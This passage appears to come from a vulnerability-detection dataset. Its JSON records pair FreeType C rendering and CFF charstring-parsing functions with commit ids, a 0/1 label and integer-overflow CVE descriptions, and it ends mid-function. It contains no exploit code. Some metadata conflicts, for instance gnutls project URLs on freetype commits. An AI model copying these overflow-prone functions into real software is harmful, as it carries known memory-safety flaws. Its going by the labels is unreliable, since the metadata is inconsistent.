"file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2014-6269", "cve_desc": "Multiple integer overflows in the http_request_forward_body function in proto_http.c in HAProxy 1.5-dev23 before 1.5.4 allow remote attackers to cause a denial of service (crash) via a large stream of data, which triggers a buffer overflow and an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-6269"}
{"idx": 158124, "project": "savannah", "commit_id": "6305b869d86ff415a33576df6d43729673c66eee", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6305b869d86ff415a33576df6d43729673c66eee", "commit_message": "None", "target": 0, "func": "  gray_render_span( int             y,\n                    int             count,\n                    const FT_Span*  spans,\n                    PWorker         worker )\n  {\n    unsigned char*  p;\n    FT_Bitmap*      map = &worker->target;\n\n\n     /* first of all, compute the scanline offset */\n     p = (unsigned char*)map->buffer - y * map->pitch;\n     if ( map->pitch >= 0 )\n      p += (unsigned)( ( map->rows - 1 ) * map->pitch );\n \n     for ( ; count > 0; count--, spans++ )\n     {\n      unsigned char  coverage = spans->coverage;\n\n\n      if ( coverage )\n      {\n        /* For small-spans it is faster to do it by ourselves than\n         * calling `memset'.  This is mainly due to the cost of the\n         * function call.\n         */\n        if ( spans->len >= 8 )\n          FT_MEM_SET( p + spans->x, (unsigned char)coverage, spans->len );\n        else\n        {\n          unsigned char*  q = p + spans->x;\n\n\n          switch ( spans->len )\n          {\n          case 7: *q++ = (unsigned char)coverage;\n          case 6: *q++ = (unsigned char)coverage;\n          case 5: *q++ = (unsigned char)coverage;\n          case 4: *q++ = (unsigned char)coverage;\n          case 3: *q++ = (unsigned char)coverage;\n          case 2: *q++ = (unsigned char)coverage;\n          case 1: *q   = (unsigned char)coverage;\n          default:\n            ;\n          }\n        }\n      }\n    }\n  }\n", "func_hash": 34358703453298665322690073547254403786, "file_name": "None", "file_hash": null, "cwe": ["CWE-189"], "cve": "CVE-2010-2500", "cve_desc": "Integer overflow in the gray_render_span function in smooth/ftgrays.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2500"}
{"idx": 158128, "project": "savannah", "commit_id": "7d3d2cc4fef72c6be9c454b3809c387e12b44cfc", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d3d2cc4fef72c6be9c454b3809c387e12b44cfc", "commit_message": "None", "target": 0, "func": "  cff_decoder_parse_charstrings( CFF_Decoder*  decoder,\n                                 FT_Byte*      charstring_base,\n                                 FT_ULong      charstring_len )\n  {\n    FT_Error           error;\n    CFF_Decoder_Zone*  zone;\n    FT_Byte*           ip;\n    FT_Byte*           limit;\n    CFF_Builder*       builder = &decoder->builder;\n    FT_Pos             x, y;\n    FT_Fixed           seed;\n    FT_Fixed*          stack;\n    FT_Int             charstring_type =\n                         decoder->cff->top_font.font_dict.charstring_type;\n\n    T2_Hints_Funcs     hinter;\n\n\n    /* set default width */\n    decoder->num_hints  = 0;\n    decoder->read_width = 1;\n\n    /* compute random seed from stack address of parameter */\n    seed = (FT_Fixed)( ( (FT_PtrDist)(char*)&seed              ^\n                         (FT_PtrDist)(char*)&decoder           ^\n                         (FT_PtrDist)(char*)&charstring_base ) &\n                         FT_ULONG_MAX ) ;\n    seed = ( seed ^ ( seed >> 10 ) ^ ( seed >> 20 ) ) & 0xFFFFL;\n    if ( seed == 0 )\n      seed = 0x7384;\n\n    /* initialize the decoder */\n    decoder->top  = decoder->stack;\n    decoder->zone = decoder->zones;\n    zone          = decoder->zones;\n    stack         = decoder->top;\n\n    hinter = (T2_Hints_Funcs)builder->hints_funcs;\n\n    builder->path_begun = 0;\n\n    zone->base           = charstring_base;\n    limit = zone->limit  = charstring_base + charstring_len;\n    ip    = zone->cursor = zone->base;\n\n    error = CFF_Err_Ok;\n\n    x = builder->pos_x;\n    y = builder->pos_y;\n\n    /* begin hints recording session, if any */\n    if ( hinter )\n      hinter->open( hinter->hints );\n\n    /* now execute loop */\n    while ( ip < limit )\n    {\n      CFF_Operator  op;\n      FT_Byte       v;\n\n\n      /********************************************************************/\n      /*                                                                  */\n      /* Decode operator or operand                                       */\n      /*                                                                  */\n      v = *ip++;\n      if ( v >= 32 || v == 28 )\n      {\n        FT_Int    shift = 16;\n        FT_Int32  val;\n\n\n        /* this is an operand, push it on the stack */\n        if ( v == 28 )\n        {\n          if ( ip + 1 >= limit )\n            goto Syntax_Error;\n          val = (FT_Short)( ( (FT_Short)ip[0] << 8 ) | ip[1] );\n          ip += 2;\n        }\n        else if ( v < 247 )\n          val = (FT_Int32)v - 139;\n        else if ( v < 251 )\n        {\n          if ( ip >= limit )\n            goto Syntax_Error;\n          val = ( (FT_Int32)v - 247 ) * 256 + *ip++ + 108;\n        }\n        else if ( v < 255 )\n        {\n          if ( ip >= limit )\n            goto Syntax_Error;\n          val = -( (FT_Int32)v - 251 ) * 256 - *ip++ - 108;\n        }\n        else\n        {\n          if ( ip + 3 >= limit )\n            goto Syntax_Error;\n          val = ( (FT_Int32)ip[0] << 24 ) |\n                ( (FT_Int32)ip[1] << 16 ) |\n                ( (FT_Int32)ip[2] <<  8 ) |\n                            ip[3];\n          ip    += 4;\n          if ( charstring_type == 2 )\n            shift = 0;\n        }\n        if ( decoder->top - stack >= CFF_MAX_OPERANDS )\n          goto Stack_Overflow;\n\n        val           <<= shift;\n        *decoder->top++ = val;\n\n#ifdef FT_DEBUG_LEVEL_TRACE\n        if ( !( val & 0xFFFFL ) )\n          FT_TRACE4(( \" %ld\", (FT_Int32)( val >> 16 ) ));\n        else\n          FT_TRACE4(( \" %.2f\", val / 65536.0 ));\n#endif\n\n      }\n      else\n      {\n        /* The specification says that normally arguments are to be taken */\n        /* from the bottom of the stack.  However, this seems not to be   */\n        /* correct, at least for Acroread 7.0.8 on GNU/Linux: It pops the */\n        /* arguments similar to a PS interpreter.                         */\n\n        FT_Fixed*  args     = decoder->top;\n        FT_Int     num_args = (FT_Int)( args - decoder->stack );\n        FT_Int     req_args;\n\n\n        /* find operator */\n        op = cff_op_unknown;\n\n        switch ( v )\n        {\n        case 1:\n          op = cff_op_hstem;\n          break;\n        case 3:\n          op = cff_op_vstem;\n          break;\n        case 4:\n          op = cff_op_vmoveto;\n          break;\n        case 5:\n          op = cff_op_rlineto;\n          break;\n        case 6:\n          op = cff_op_hlineto;\n          break;\n        case 7:\n          op = cff_op_vlineto;\n          break;\n        case 8:\n          op = cff_op_rrcurveto;\n          break;\n        case 9:\n          op = cff_op_closepath;\n          break;\n        case 10:\n          op = cff_op_callsubr;\n          break;\n        case 11:\n          op = cff_op_return;\n          break;\n        case 12:\n          {\n            if ( ip >= limit )\n              goto Syntax_Error;\n            v = *ip++;\n\n            switch ( v )\n            {\n            case 0:\n              op = cff_op_dotsection;\n              break;\n            case 1: /* this is actually the Type1 vstem3 operator */\n              op = cff_op_vstem;\n              break;\n            case 2: /* this is actually the Type1 hstem3 operator */\n              op = cff_op_hstem;\n              break;\n            case 3:\n              op = cff_op_and;\n              break;\n            case 4:\n              op = cff_op_or;\n              break;\n            case 5:\n              op = cff_op_not;\n              break;\n            case 6:\n              op = cff_op_seac;\n              break;\n            case 7:\n              op = cff_op_sbw;\n              break;\n            case 8:\n              op = cff_op_store;\n              break;\n            case 9:\n              op = cff_op_abs;\n              break;\n            case 10:\n              op = cff_op_add;\n              break;\n            case 11:\n              op = cff_op_sub;\n              break;\n            case 12:\n              op = cff_op_div;\n              break;\n            case 13:\n              op = cff_op_load;\n              break;\n            case 14:\n              op = cff_op_neg;\n              break;\n            case 15:\n              op = cff_op_eq;\n              break;\n            case 16:\n              op = cff_op_callothersubr;\n              break;\n            case 17:\n              op = cff_op_pop;\n              break;\n            case 18:\n              op = cff_op_drop;\n              break;\n            case 20:\n              op = cff_op_put;\n              break;\n            case 21:\n              op = cff_op_get;\n              break;\n            case 22:\n              op = cff_op_ifelse;\n              break;\n            case 23:\n              op = cff_op_random;\n              break;\n            case 24:\n              op = cff_op_mul;\n              break;\n            case 26:\n              op = cff_op_sqrt;\n              break;\n            case 27:\n              op = cff_op_dup;\n              break;\n            case 28:\n              op = cff_op_exch;\n              break;\n            case 29:\n              op = cff_op_index;\n              break;\n            case 30:\n              op = cff_op_roll;\n              break;\n            case 33:\n              op = cff_op_setcurrentpoint;\n              break;\n            case 34:\n              op = cff_op_hflex;\n              break;\n            case 35:\n              op = cff_op_flex;\n              break;\n            case 36:\n              op = cff_op_hflex1;\n              break;\n            case 37:\n              op = cff_op_flex1;\n              break;\n            default:\n              /* decrement ip for syntax error message */\n              ip--;\n            }\n          }\n          break;\n        case 13:\n          op = cff_op_hsbw;\n          break;\n        case 14:\n          op = cff_op_endchar;\n          break;\n        case 16:\n          op = cff_op_blend;\n          break;\n        case 18:\n          op = cff_op_hstemhm;\n          break;\n        case 19:\n          op = cff_op_hintmask;\n          break;\n        case 20:\n          op = cff_op_cntrmask;\n          break;\n        case 21:\n          op = cff_op_rmoveto;\n          break;\n        case 22:\n          op = cff_op_hmoveto;\n          break;\n        case 23:\n          op = cff_op_vstemhm;\n          break;\n        case 24:\n          op = cff_op_rcurveline;\n          break;\n        case 25:\n          op = cff_op_rlinecurve;\n          break;\n        case 26:\n          op = cff_op_vvcurveto;\n          break;\n        case 27:\n          op = cff_op_hhcurveto;\n          break;\n        case 29:\n          op = cff_op_callgsubr;\n          break;\n        case 30:\n          op = cff_op_vhcurveto;\n          break;\n        case 31:\n          op = cff_op_hvcurveto;\n          break;\n        default:\n          break;\n        }\n\n        if ( op == cff_op_unknown )\n          goto Syntax_Error;\n\n        /* check arguments */\n        req_args = cff_argument_counts[op];\n        if ( req_args & CFF_COUNT_CHECK_WIDTH )\n        {\n          if ( num_args > 0 && decoder->read_width )\n          {\n            /* If `nominal_width' is non-zero, the number is really a      */\n            /* difference against `nominal_width'.  Else, the number here  */\n            /* is truly a width, not a difference against `nominal_width'. */\n            /* If the font does not set `nominal_width', then              */\n            /* `nominal_width' defaults to zero, and so we can set         */\n            /* `glyph_width' to `nominal_width' plus number on the stack   */\n            /* -- for either case.                                         */\n\n            FT_Int  set_width_ok;\n\n\n            switch ( op )\n            {\n            case cff_op_hmoveto:\n            case cff_op_vmoveto:\n              set_width_ok = num_args & 2;\n              break;\n\n            case cff_op_hstem:\n            case cff_op_vstem:\n            case cff_op_hstemhm:\n            case cff_op_vstemhm:\n            case cff_op_rmoveto:\n            case cff_op_hintmask:\n            case cff_op_cntrmask:\n              set_width_ok = num_args & 1;\n              break;\n\n            case cff_op_endchar:\n              /* If there is a width specified for endchar, we either have */\n              /* 1 argument or 5 arguments.  We like to argue.             */\n              set_width_ok = ( num_args == 5 ) || ( num_args == 1 );\n              break;\n\n            default:\n              set_width_ok = 0;\n              break;\n            }\n\n            if ( set_width_ok )\n            {\n              decoder->glyph_width = decoder->nominal_width +\n                                       ( stack[0] >> 16 );\n\n              if ( decoder->width_only )\n              {\n                /* we only want the advance width; stop here */\n                break;\n              }\n\n              /* Consumed an argument. */\n              num_args--;\n            }\n          }\n\n          decoder->read_width = 0;\n          req_args            = 0;\n        }\n\n        req_args &= 0x000F;\n        if ( num_args < req_args )\n          goto Stack_Underflow;\n        args     -= req_args;\n        num_args -= req_args;\n\n        /* At this point, `args' points to the first argument of the  */\n        /* operand in case `req_args' isn't zero.  Otherwise, we have */\n        /* to adjust `args' manually.                                 */\n\n        /* Note that we only pop arguments from the stack which we    */\n        /* really need and can digest so that we can continue in case */\n        /* of superfluous stack elements.                             */\n\n        switch ( op )\n        {\n        case cff_op_hstem:\n        case cff_op_vstem:\n        case cff_op_hstemhm:\n        case cff_op_vstemhm:\n          /* the number of arguments is always even here */\n          FT_TRACE4((\n              op == cff_op_hstem   ? \" hstem\\n\"   :\n            ( op == cff_op_vstem   ? \" vstem\\n\"   :\n            ( op == cff_op_hstemhm ? \" hstemhm\\n\" : \" vstemhm\\n\" ) ) ));\n\n          if ( hinter )\n            hinter->stems( hinter->hints,\n                           ( op == cff_op_hstem || op == cff_op_hstemhm ),\n                           num_args / 2,\n                           args - ( num_args & ~1 ) );\n\n          decoder->num_hints += num_args / 2;\n          args = stack;\n          break;\n\n        case cff_op_hintmask:\n        case cff_op_cntrmask:\n          FT_TRACE4(( op == cff_op_hintmask ? \" hintmask\" : \" cntrmask\" ));\n\n          /* implement vstem when needed --                        */\n          /* the specification doesn't say it, but this also works */\n          /* with the 'cntrmask' operator                          */\n          /*                                                       */\n          if ( num_args > 0 )\n          {\n            if ( hinter )\n              hinter->stems( hinter->hints,\n                             0,\n                             num_args / 2,\n                             args - ( num_args & ~1 ) );\n\n            decoder->num_hints += num_args / 2;\n          }\n\n          if ( hinter )\n          {\n            if ( op == cff_op_hintmask )\n              hinter->hintmask( hinter->hints,\n                                builder->current->n_points,\n                                decoder->num_hints,\n                                ip );\n            else\n              hinter->counter( hinter->hints,\n                               decoder->num_hints,\n                               ip );\n          }\n\n#ifdef FT_DEBUG_LEVEL_TRACE\n          {\n            FT_UInt maskbyte;\n\n\n            FT_TRACE4(( \" (maskbytes: \" ));\n\n            for ( maskbyte = 0;\n                  maskbyte < (FT_UInt)(( decoder->num_hints + 7 ) >> 3);\n                  maskbyte++, ip++ )\n              FT_TRACE4(( \"0x%02X\", *ip ));\n\n            FT_TRACE4(( \")\\n\" ));\n          }\n#else\n          ip += ( decoder->num_hints + 7 ) >> 3;\n#endif\n          if ( ip >= limit )\n            goto Syntax_Error;\n          args = stack;\n          break;\n\n        case cff_op_rmoveto:\n          FT_TRACE4(( \" rmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          x   += args[-2];\n          y   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_vmoveto:\n          FT_TRACE4(( \" vmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          y   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_hmoveto:\n          FT_TRACE4(( \" hmoveto\\n\" ));\n\n          cff_builder_close_contour( builder );\n          builder->path_begun = 0;\n          x   += args[-1];\n          args = stack;\n          break;\n\n        case cff_op_rlineto:\n          FT_TRACE4(( \" rlineto\\n\" ));\n\n          if ( cff_builder_start_point ( builder, x, y ) ||\n               check_points( builder, num_args / 2 )     )\n            goto Fail;\n\n          if ( num_args < 2 )\n            goto Stack_Underflow;\n\n          args -= num_args & ~1;\n          while ( args < decoder->top )\n          {\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 1 );\n            args += 2;\n          }\n          args = stack;\n          break;\n\n        case cff_op_hlineto:\n        case cff_op_vlineto:\n          {\n            FT_Int  phase = ( op == cff_op_hlineto );\n\n\n            FT_TRACE4(( op == cff_op_hlineto ? \" hlineto\\n\"\n                                             : \" vlineto\\n\" ));\n\n            if ( num_args < 1 )\n              goto Stack_Underflow;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, num_args )         )\n              goto Fail;\n\n            args = stack;\n            while ( args < decoder->top )\n            {\n              if ( phase )\n                x += args[0];\n              else\n                y += args[0];\n\n              if ( cff_builder_add_point1( builder, x, y ) )\n                goto Fail;\n\n              args++;\n              phase ^= 1;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_rrcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rrcurveto\\n\" ));\n\n            if ( num_args < 6 )\n              goto Stack_Underflow;\n\n            nargs = num_args - num_args % 6;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, nargs / 2 )     )\n              goto Fail;\n\n            args -= nargs;\n            while ( args < decoder->top )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[2];\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[4];\n              y += args[5];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 6;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_vvcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" vvcurveto\\n\" ));\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 4n or 4n+1, */\n            /* we reduce it to 4n+1                      */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            args -= nargs;\n\n            if ( nargs & 1 )\n            {\n              x += args[0];\n              args++;\n              nargs--;\n            }\n\n            if ( check_points( builder, 3 * ( nargs / 4 ) ) )\n              goto Fail;\n\n            while ( args < decoder->top )\n            {\n              y += args[0];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[1];\n              y += args[2];\n              cff_builder_add_point( builder, x, y, 0 );\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 4;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_hhcurveto:\n          {\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" hhcurveto\\n\" ));\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 4n or 4n+1, */\n            /* we reduce it to 4n+1                      */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            args -= nargs;\n            if ( nargs & 1 )\n            {\n              y += args[0];\n              args++;\n              nargs--;\n            }\n\n            if ( check_points( builder, 3 * ( nargs / 4 ) ) )\n              goto Fail;\n\n            while ( args < decoder->top )\n            {\n              x += args[0];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[1];\n              y += args[2];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[3];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 4;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_vhcurveto:\n        case cff_op_hvcurveto:\n          {\n            FT_Int  phase;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( op == cff_op_vhcurveto ? \" vhcurveto\\n\"\n                                               : \" hvcurveto\\n\" ));\n\n            if ( cff_builder_start_point( builder, x, y ) )\n              goto Fail;\n\n            if ( num_args < 4 )\n              goto Stack_Underflow;\n\n            /* if num_args isn't of the form 8n, 8n+1, 8n+4, or 8n+5, */\n            /* we reduce it to the largest one which fits             */\n\n            nargs = num_args - num_args % 4;\n            if ( num_args - nargs > 0 )\n              nargs += 1;\n\n            args -= nargs;\n            if ( check_points( builder, ( nargs / 4 ) * 3 ) )\n              goto Stack_Underflow;\n\n            phase = ( op == cff_op_hvcurveto );\n\n            while ( nargs >= 4 )\n            {\n              nargs -= 4;\n              if ( phase )\n              {\n                x += args[0];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[1];\n                y += args[2];\n                cff_builder_add_point( builder, x, y, 0 );\n                y += args[3];\n                if ( nargs == 1 )\n                  x += args[4];\n                cff_builder_add_point( builder, x, y, 1 );\n              }\n              else\n              {\n                y += args[0];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[1];\n                y += args[2];\n                cff_builder_add_point( builder, x, y, 0 );\n                x += args[3];\n                if ( nargs == 1 )\n                  y += args[4];\n                cff_builder_add_point( builder, x, y, 1 );\n              }\n              args  += 4;\n              phase ^= 1;\n            }\n            args = stack;\n          }\n          break;\n\n        case cff_op_rlinecurve:\n          {\n            FT_Int  num_lines;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rlinecurve\\n\" ));\n\n            if ( num_args < 8 )\n              goto Stack_Underflow;\n\n            nargs     = num_args & ~1;\n            num_lines = ( nargs - 6 ) / 2;\n\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, num_lines + 3 )   )\n              goto Fail;\n\n            args -= nargs;\n\n            /* first, add the line segments */\n            while ( num_lines > 0 )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 2;\n              num_lines--;\n            }\n\n            /* then the curve */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 0 );\n            x += args[2];\n            y += args[3];\n            cff_builder_add_point( builder, x, y, 0 );\n            x += args[4];\n            y += args[5];\n            cff_builder_add_point( builder, x, y, 1 );\n            args = stack;\n          }\n          break;\n\n        case cff_op_rcurveline:\n          {\n            FT_Int  num_curves;\n            FT_Int  nargs;\n\n\n            FT_TRACE4(( \" rcurveline\\n\" ));\n\n            if ( num_args < 8 )\n              goto Stack_Underflow;\n\n            nargs      = num_args - 2;\n            nargs      = nargs - nargs % 6 + 2;\n            num_curves = ( nargs - 2 ) / 6;\n\n            if ( cff_builder_start_point ( builder, x, y ) ||\n                 check_points( builder, num_curves * 3 + 2 ) )\n              goto Fail;\n\n            args -= nargs;\n\n            /* first, add the curves */\n            while ( num_curves > 0 )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[2];\n              y += args[3];\n              cff_builder_add_point( builder, x, y, 0 );\n              x += args[4];\n              y += args[5];\n              cff_builder_add_point( builder, x, y, 1 );\n              args += 6;\n              num_curves--;\n            }\n\n            /* then the final line */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 1 );\n            args = stack;\n          }\n          break;\n\n        case cff_op_hflex1:\n          {\n            FT_Pos start_y;\n\n\n            FT_TRACE4(( \" hflex1\\n\" ));\n\n            /* adding five more points: 4 control points, 1 on-curve point */\n            /* -- make sure we have enough space for the start point if it */\n            /* needs to be added                                           */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's y position for later use */\n            start_y = y;\n\n            /* first control point */\n            x += args[0];\n            y += args[1];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* second control point */\n            x += args[2];\n            y += args[3];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* join point; on curve, with y-value the same as the last */\n            /* control point's y-value                                 */\n            x += args[4];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            /* third control point, with y-value the same as the join */\n            /* point's y-value                                        */\n            x += args[5];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* fourth control point */\n            x += args[6];\n            y += args[7];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* ending point, with y-value the same as the start   */\n            x += args[8];\n            y  = start_y;\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n          }\n\n        case cff_op_hflex:\n          {\n            FT_Pos start_y;\n\n\n            FT_TRACE4(( \" hflex\\n\" ));\n\n            /* adding six more points; 4 control points, 2 on-curve points */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's y-position for later use */\n            start_y = y;\n\n            /* first control point */\n            x += args[0];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* second control point */\n            x += args[1];\n            y += args[2];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* join point; on curve, with y-value the same as the last */\n            /* control point's y-value                                 */\n            x += args[3];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            /* third control point, with y-value the same as the join */\n            /* point's y-value                                        */\n            x += args[4];\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* fourth control point */\n            x += args[5];\n            y  = start_y;\n            cff_builder_add_point( builder, x, y, 0 );\n\n            /* ending point, with y-value the same as the start point's */\n            /* y-value -- we don't add this point, though               */\n            x += args[6];\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n          }\n\n        case cff_op_flex1:\n          {\n            FT_Pos     start_x, start_y; /* record start x, y values for */\n                                         /* alter use                    */\n            FT_Fixed   dx = 0, dy = 0;   /* used in horizontal/vertical  */\n                                         /* algorithm below              */\n            FT_Int     horizontal, count;\n            FT_Fixed*  temp;\n\n\n            FT_TRACE4(( \" flex1\\n\" ));\n\n            /* adding six more points; 4 control points, 2 on-curve points */\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            /* record the starting point's x, y position for later use */\n            start_x = x;\n            start_y = y;\n\n            /* XXX: figure out whether this is supposed to be a horizontal */\n            /*      or vertical flex; the Type 2 specification is vague... */\n\n            temp = args;\n\n            /* grab up to the last argument */\n            for ( count = 5; count > 0; count-- )\n            {\n              dx += temp[0];\n              dy += temp[1];\n              temp += 2;\n            }\n\n            if ( dx < 0 )\n              dx = -dx;\n            if ( dy < 0 )\n              dy = -dy;\n\n            /* strange test, but here it is... */\n            horizontal = ( dx > dy );\n\n            for ( count = 5; count > 0; count-- )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y,\n                                     (FT_Bool)( count == 3 ) );\n              args += 2;\n            }\n\n            /* is last operand an x- or y-delta? */\n            if ( horizontal )\n            {\n              x += args[0];\n              y  = start_y;\n            }\n            else\n            {\n              x  = start_x;\n              y += args[0];\n            }\n\n            cff_builder_add_point( builder, x, y, 1 );\n\n            args = stack;\n            break;\n           }\n\n        case cff_op_flex:\n          {\n            FT_UInt  count;\n\n\n            FT_TRACE4(( \" flex\\n\" ));\n\n            if ( cff_builder_start_point( builder, x, y ) ||\n                 check_points( builder, 6 )               )\n              goto Fail;\n\n            for ( count = 6; count > 0; count-- )\n            {\n              x += args[0];\n              y += args[1];\n              cff_builder_add_point( builder, x, y,\n                                     (FT_Bool)( count == 4 || count == 1 ) );\n              args += 2;\n            }\n\n            args = stack;\n          }\n          break;\n\n        case cff_op_seac:\n            FT_TRACE4(( \" seac\\n\" ));\n\n            error = cff_operator_seac( decoder,\n                                       args[0], args[1], args[2],\n                                       (FT_Int)( args[3] >> 16 ),\n                                       (FT_Int)( args[4] >> 16 ) );\n\n            /* add current outline to the glyph slot */\n            FT_GlyphLoader_Add( builder->loader );\n\n            /* return now! */\n            FT_TRACE4(( \"\\n\" ));\n            return error;\n\n        case cff_op_endchar:\n          FT_TRACE4(( \" endchar\\n\" ));\n\n          /* We are going to emulate the seac operator. */\n          if ( num_args >= 4 )\n          {\n            /* Save glyph width so that the subglyphs don't overwrite it. */\n            FT_Pos  glyph_width = decoder->glyph_width;\n\n            error = cff_operator_seac( decoder,\n                                       0L, args[-4], args[-3],\n                                       (FT_Int)( args[-2] >> 16 ),\n                                       (FT_Int)( args[-1] >> 16 ) );\n\n            decoder->glyph_width = glyph_width;\n          }\n          else\n          {\n            if ( !error )\n              error = CFF_Err_Ok;\n\n            cff_builder_close_contour( builder );\n\n            /* close hints recording session */\n            if ( hinter )\n            {\n              if ( hinter->close( hinter->hints,\n                                  builder->current->n_points ) )\n                goto Syntax_Error;\n\n              /* apply hints to the loaded glyph outline now */\n              hinter->apply( hinter->hints,\n                             builder->current,\n                             (PSH_Globals)builder->hints_globals,\n                             decoder->hint_mode );\n            }\n\n            /* add current outline to the glyph slot */\n            FT_GlyphLoader_Add( builder->loader );\n          }\n\n          /* return now! */\n          FT_TRACE4(( \"\\n\" ));\n          return error;\n\n        case cff_op_abs:\n          FT_TRACE4(( \" abs\\n\" ));\n\n          if ( args[0] < 0 )\n            args[0] = -args[0];\n          args++;\n          break;\n\n        case cff_op_add:\n          FT_TRACE4(( \" add\\n\" ));\n\n          args[0] += args[1];\n          args++;\n          break;\n\n        case cff_op_sub:\n          FT_TRACE4(( \" sub\\n\" ));\n\n          args[0] -= args[1];\n          args++;\n          break;\n\n        case cff_op_div:\n          FT_TRACE4(( \" div\\n\" ));\n\n          args[0] = FT_DivFix( args[0], args[1] );\n          args++;\n          break;\n\n        case cff_op_neg:\n          FT_TRACE4(( \" neg\\n\" ));\n\n          args[0] = -args[0];\n          args++;\n          break;\n\n        case cff_op_random:\n          {\n            FT_Fixed  Rand;\n\n\n            FT_TRACE4(( \" rand\\n\" ));\n\n            Rand = seed;\n            if ( Rand >= 0x8000L )\n              Rand++;\n\n            args[0] = Rand;\n            seed    = FT_MulFix( seed, 0x10000L - seed );\n            if ( seed == 0 )\n              seed += 0x2873;\n            args++;\n          }\n          break;\n\n        case cff_op_mul:\n          FT_TRACE4(( \" mul\\n\" ));\n\n          args[0] = FT_MulFix( args[0], args[1] );\n          args++;\n          break;\n\n        case cff_op_sqrt:\n          FT_TRACE4(( \" sqrt\\n\" ));\n\n          if ( args[0] > 0 )\n          {\n            FT_Int    count = 9;\n            FT_Fixed  root  = args[0];\n            FT_Fixed  new_root;\n\n\n            for (;;)\n            {\n              new_root = ( root + FT_DivFix( args[0], root ) + 1 ) >> 1;\n              if ( new_root == root || count <= 0 )\n                break;\n              root = new_root;\n            }\n            args[0] = new_root;\n          }\n          else\n            args[0] = 0;\n          args++;\n          break;\n\n        case cff_op_drop:\n          /* nothing */\n          FT_TRACE4(( \" drop\\n\" ));\n\n          break;\n\n        case cff_op_exch:\n          {\n            FT_Fixed  tmp;\n\n\n            FT_TRACE4(( \" exch\\n\" ));\n\n            tmp     = args[0];\n            args[0] = args[1];\n            args[1] = tmp;\n            args   += 2;\n          }\n          break;\n\n        case cff_op_index:\n          {\n            FT_Int  idx = (FT_Int)( args[0] >> 16 );\n\n\n            FT_TRACE4(( \" index\\n\" ));\n\n            if ( idx < 0 )\n              idx = 0;\n            else if ( idx > num_args - 2 )\n              idx = num_args - 2;\n            args[0] = args[-( idx + 1 )];\n            args++;\n          }\n          break;\n\n        case cff_op_roll:\n          {\n            FT_Int  count = (FT_Int)( args[0] >> 16 );\n            FT_Int  idx   = (FT_Int)( args[1] >> 16 );\n\n\n            